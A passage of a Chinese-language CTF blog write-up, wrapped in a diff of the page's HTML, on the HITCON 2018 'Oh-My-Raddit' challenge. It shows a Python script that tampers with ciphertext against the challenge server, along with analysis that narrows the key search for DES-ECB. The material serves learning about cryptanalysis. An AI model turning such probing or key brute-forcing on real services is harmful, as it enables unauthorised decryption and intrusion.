@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.font.im/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+<script data-ad-client="ca-pub-9381923643450020" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.wonderkun.cc","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="之前在web中题目中也有很多次遇到密码学的问题，但大多数都是已知了加密部分的代码，也就是已知了加密算法和加密模式，攻击目的一般是泄露密钥，或者伪造明文或者泄露明文。攻击方法常用的有CBC反转， padding oracle，hash长度扩展攻击，重放攻击等。但是像这一次的唯密文攻击的，还真是第一次遇到，所以就有点无从下手，主要还是密码学的知识太匮乏了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习">
+<meta property="og:url" content="http://blog.wonderkun.cc/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="wonderkun&#39;s | blog">
+<meta property="og:description" content="之前在web中题目中也有很多次遇到密码学的问题，但大多数都是已知了加密部分的代码，也就是已知了加密算法和加密模式，攻击目的一般是泄露密钥，或者伪造明文或者泄露明文。攻击方法常用的有CBC反转， padding oracle，hash长度扩展攻击，重放攻击等。但是像这一次的唯密文攻击的，还真是第一次遇到，所以就有点无从下手，主要还是密码学的知识太匮乏了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-10-25T11:23:21.000Z">
+<meta property="article:modified_time" content="2024-11-18T11:46:14.718Z">
+<meta property="article:author" content="wonderkun">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="hitcon2018">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://blog.wonderkun.cc/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习 | wonderkun's | blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1a23c3c0cdc421d3cfd3c63dc9721ffe";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">wonderkun's | blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">share with you!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/wonderkun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.wonderkun.cc/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+      <meta itemprop="name" content="wonderkun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wonderkun's | blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-10-25 19:23:21" itemprop="dateCreated datePublished" datetime="2018-10-25T19:23:21+08:00">2018-10-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-18 19:46:14" itemprop="dateModified" datetime="2024-11-18T19:46:14+08:00">2024-11-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/hack-ctf/" itemprop="url" rel="index"><span itemprop="name">hack_ctf</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/" class="post-meta-item leancloud_visitors" data-flag-title="hitcon2018受虐笔记二:Oh-My-Raddit-1-and-2学习" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/10/25/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%BA%8C%20Oh-My-Raddit-1-and-2%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>之前在web中题目中也有很多次遇到密码学的问题，但大多数都是已知了加密部分的代码，也就是已知了加密算法和加密模式，攻击目的一般是泄露密钥，或者伪造明文或者泄露明文。攻击方法常用的有CBC反转， padding oracle，hash长度扩展攻击，重放攻击等。但是像这一次的唯密文攻击的，还真是第一次遇到，所以就有点无从下手，主要还是密码学的知识太匮乏了。</p>
+<a id="more"></a>
+
+<p>下面是看了别人的writeup之后，又顺着当时自己的做题思路，继续学习的过程。</p>
+<h3 id="Oh-My-Raddit-1-学习笔记"><a href="#Oh-My-Raddit-1-学习笔记" class="headerlink" title="Oh-My-Raddit-1 学习笔记"></a>Oh-My-Raddit-1 学习笔记</h3><p>题目中的链接是这样的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?s=8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e"</span>&gt;</span>50 million Facebook accounts owned<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>点击之后就会发生一次303跳转，跳转到一个地址：</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="type"></span>//<span class="keyword">new</span><span class="type">sroom</span>.fb.com/<span class="keyword">new</span><span class="type">s</span>/<span class="number">2018</span>/<span class="number">09</span>/security-update/</span><br></pre></td></tr></table></figure>
+
+<p>所以猜想s参数可能跟最终跳转的url之间存在某种关系，可能是url的加密值。于是把所有的s参数值和url的值都抓取下来，并且统计长度用逗号隔开,存为csv文件，如下显示:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">密文,密文长度,url长度,url</span><br><span class="line"></span><br><span class="line">8c762b8f22036dbbdda56facf732ffa71c3a372e4530241246449a55e25888cf98164f49a25f54a84ea0640e3adaf107cc67c8f2e688e8adf18895d89bfae58e33ae2e67609b509afb0e52f2f8b2145e,160,53,https://newsroom.fb.com/news/2018/09/security-update/</span><br><span class="line"></span><br><span class="line">b8cefd6eb48eb05a2a6455031697145597fd94cc1ddf5de9d1ced9f3ba9f0671294f7e621271724379f8866765581ed27a11fbf32a65c9c5fa555e936059c30ae7e0574415898d59825eaf40b8ca4b6b4c495604c766de6410158def0234ca52d3a472f56cbc6007a2be6b76d1489fb1d1968e7d8d19f94970b8924776e4aad7fe36cd98ce5e1381db456c31e215b5bf3ca92540eb2d0a42,304,117,https://blog.netlab.360.com/70-different-types-of-home-routers-all-together-100000-are-being-hijacked-by-ghostdns-en/</span><br><span class="line"></span><br><span class="line">68935751c61b2cbf9b23a8a310cc25357d90e8ec90d21429132b8e6a7069a3af361b3d849b06b5cc92f33f42305f794b7551f5397ba46a5b452ab65a472ac6415e697a86b2b618a9c9cf94ea64cd49b2b2780d3cf5b55c51b70a9a2903fb58e786a4d5c5dc412819,208,73,https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>看到下面两条数据：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span><span class="keyword">c</span><span class="number">762</span>b<span class="number">8</span>f<span class="number">22036</span>dbbdda<span class="number">56</span>facf<span class="number">732</span>ffa<span class="number">71</span><span class="keyword">c</span><span class="number">3</span>a<span class="number">372e4530241246449</span>a<span class="number">55e25888</span>cf<span class="number">98164</span>f<span class="number">49</span>a<span class="number">25</span>f<span class="number">54</span>a<span class="number">84</span>ea<span class="number">0640e3</span>adaf<span class="number">107</span><span class="keyword">cc</span><span class="number">67</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">2e688</span>e<span class="number">8</span>adf<span class="number">18895</span>d<span class="number">89</span>bfae<span class="number">58e33</span>ae<span class="number">2e67609</span>b<span class="number">509</span>afb<span class="number">0e52</span>f<span class="number">2</span>f<span class="number">8</span>b<span class="number">2145</span>e,<span class="number">160</span>,<span class="number">53</span>,https://newsroom.fb.com/news/<span class="number">2018</span>/<span class="number">09</span>/security-update/</span><br><span class="line"></span><br><span class="line">a<span class="number">164</span>de<span class="number">5</span><span class="keyword">c</span><span class="number">0574559</span><span class="keyword">c</span><span class="number">7181</span>f<span class="number">4</span>ff<span class="number">4</span>ee<span class="number">6693</span><span class="keyword">c</span><span class="number">8740</span>afb<span class="number">01</span>d<span class="number">3</span><span class="keyword">c</span><span class="number">8</span>d<span class="number">6</span>f<span class="number">1</span><span class="keyword">c</span><span class="number">5</span>bc<span class="number">1</span>d<span class="number">931</span>bb<span class="number">57</span>cf<span class="number">2</span>d<span class="number">17</span>cbc<span class="number">566279</span>d<span class="number">6</span>f<span class="number">51</span>fdf<span class="number">7</span><span class="keyword">c</span><span class="number">38111</span>ee<span class="number">10602</span>ad<span class="number">1</span>a<span class="number">9467</span>cb<span class="number">0</span>db<span class="number">9</span>d<span class="number">80</span>eb<span class="number">3</span><span class="keyword">c</span><span class="number">9</span>a<span class="number">5</span>ff<span class="number">4</span>b<span class="number">33674</span><span class="keyword">c</span><span class="number">613</span>d<span class="number">436</span>ac<span class="number">902241</span>ce<span class="number">2</span>f<span class="number">5</span>d<span class="number">5</span>ab<span class="number">0825</span>a<span class="number">6</span>bdd<span class="number">41073</span>fb<span class="number">6e31202</span>b<span class="number">4</span>fcd<span class="number">3e2</span>dc<span class="number">08</span>b<span class="number">0</span>ec<span class="number">4469e20</span>ff<span class="number">376</span>,<span class="number">208</span>,<span class="number">53</span>,https://www.securifera.com/blog/<span class="number">2018</span>/<span class="number">10</span>/<span class="number">07</span>/servicefu/</span><br></pre></td></tr></table></figure>
+
+<p>两条数据的url长度相同，但是密文长度却相差很多，这就说明了密文可能并不仅仅是对url进行加密的结果。</p>
+<p>而可能是对url和其他一些内容的加密<code>ciphertext=encrypt(url+something)</code></p>
+<p><strong>仔细观察密文，可以发现密文都是16的倍数，因为密文都是16进制，所以密文长度应该都是8 bytes的倍数，于是可以猜测出此加密算法是分组加密，分组长度是8 bytes。</strong></p>
+<p>下面我又进行了另外一个实验，我从密文的第一位开始，每次只修改密文一位的值，看解密后是否能够成功跳转到原来的url地址，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> copy </span><br><span class="line">randStr = <span class="string">'0123456789abcdef'</span></span><br><span class="line">host = <span class="string">"http://13.115.255.46/?s="</span></span><br><span class="line">url = list(<span class="string">'1a969e9e7488c391428ca12b3a2280f83389d6fdd40c68c29f085cacc2c7a7cc2fb7465584101c689b2058ce85aa3606dfd91fd183144892b1d39e0b730702448ca6ac0be7436e2409c5f576db0d26341afd7a398b0473de743dbdc5d810ebde3282d9a673ace6d23054124f8c79aa420bb0032c89336b1bd9d51086fba2caafaee2b8b4568118b5999b89fb35cb2fe24c181b95a8281a7b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(url)):</span><br><span class="line">    print(<span class="string">"[-] "</span>+str(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> randStr:</span><br><span class="line">        tmp = copy.deepcopy(url)</span><br><span class="line">        tmp[i] = j</span><br><span class="line">        realUrl = host + <span class="string">''</span>.join(tmp)</span><br><span class="line">        res = requests.get(realUrl,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">303</span>:</span><br><span class="line">            <span class="keyword">if</span> tmp != url:</span><br><span class="line">                print(<span class="string">"[+] "</span>+str(i)+<span class="string">":"</span>+realUrl)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> res.status_code==<span class="number">500</span>:</span><br><span class="line">            print(<span class="string">"[+] "</span>+str(i)+<span class="string">":"</span>+res.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行之后，发现：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[-] <span class="number">95</span></span><br><span class="line">[-] <span class="number">96</span></span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36060</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36061</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br><span class="line">[+] <span class="number">96</span>:http://<span class="number">13.115</span>.<span class="number">255.46</span>/?s=<span class="number">1</span>a<span class="number">969e9</span>e<span class="number">7488</span><span class="keyword">c</span><span class="number">391428</span>ca<span class="number">12</span>b<span class="number">3</span>a<span class="number">2280</span>f<span class="number">83389</span>d<span class="number">6</span>fdd<span class="number">40</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">29</span>f<span class="number">085</span>cacc<span class="number">2</span><span class="keyword">c</span><span class="number">7</span>a<span class="number">7</span><span class="keyword">cc</span><span class="number">2</span>fb<span class="number">7465584101</span><span class="keyword">c</span><span class="number">689</span>b<span class="number">2058</span>ce<span class="number">85</span>aa<span class="number">36062</span>fd<span class="number">91</span>fd<span class="number">183144892</span>b<span class="number">1</span>d<span class="number">39e0</span>b<span class="number">730702448</span>ca<span class="number">6</span>ac<span class="number">0</span>be<span class="number">7436e2409</span><span class="keyword">c</span><span class="number">5</span>f<span class="number">576</span>db<span class="number">0</span>d<span class="number">26341</span>afd<span class="number">7</span>a<span class="number">398</span>b<span class="number">0473</span>de<span class="number">743</span>dbdc<span class="number">5</span>d<span class="number">810</span>ebde<span class="number">3282</span>d<span class="number">9</span>a<span class="number">673</span>ace<span class="number">6</span>d<span class="number">23054124</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">79</span>aa<span class="number">420</span>bb<span class="number">0032</span><span class="keyword">c</span><span class="number">89336</span>b<span class="number">1</span>bd<span class="number">9</span>d<span class="number">51086</span>fba<span class="number">2</span>caafaee<span class="number">2</span>b<span class="number">8</span>b<span class="number">4568118</span>b<span class="number">5999</span>b<span class="number">89</span>fb<span class="number">35</span>cb<span class="number">2</span>fe<span class="number">24</span><span class="keyword">c</span><span class="number">181</span>b<span class="number">95</span>a<span class="number">8281</span>a<span class="number">7</span>b</span><br></pre></td></tr></table></figure>
+
+<p>所以的密文都是对96位之后的部分进行修改，都能成功的解密出来url地址，96位之前的任意一位进行修改都会导致无法解密出来正确的url。</p>
+<p><strong>这个结果可以告诉我们两个信息，第一：密文的前96位跟url相关。第二：密文的分组之间是没有依赖关系的(如果有依赖关系的话，对前面的部分进行修改，必然会导致密文整体解密失败，不会出现大片的解密成功的情况)。</strong></p>
+<p>根据第一个信息，不定长的url被处理成了定长的密文，那么最容易想到的方式就是padding，但是很多url的长度是大于48 bytes的(密文长度)，所以应该不是padding。那很有可能加密的仅仅是一个定长的url ID值，然后在数据库中查出相对应的url地址。</p>
+<p>根据第二个信息，因为是分组加密，并且分组之间是没有传导性的依赖关系，所以可以猜想加密模式是最简单的ECB了。</p>
+<p>常用的分组加密也不过是DES和AES，但是AES最短的分组长度是128bits,所以常见的64bites分组的加密也只有是DES了。 所以猜想加密算法可能是DES-ECB。</p>
+<p>又因为题目中的提示，说明密钥是小写的字母[a-z]：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="module-access"><span class="module"><span class="identifier">ENCRYPTION_KEY</span>.</span></span>islower<span class="literal">()</span></span><br></pre></td></tr></table></figure>
+
+<p>又因为DES加密中，长度为64bits的密钥其实只有56位参与了DES运算（第8、16、24、32、40、48、56、64位是校验位），所以密钥的每个字母的二进制都要去掉最低位，所以密钥中出现的b和c在舍弃最低位之后其实是等价的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: bin(ord(<span class="string">'b'</span>))</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">'0b1100010'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: bin(ord(<span class="string">'c'</span>))</span><br><span class="line">Out[<span class="number">5</span>]: <span class="string">'0b1100011'</span></span><br></pre></td></tr></table></figure>
+
+<p>所以密钥是在<code>abdfhjlnprtvxz</code>中选出8个，爆破空间是<code>14**8</code>,只要我们找到一组密文和明文的对应，就可以爆破出来密钥了。</p>
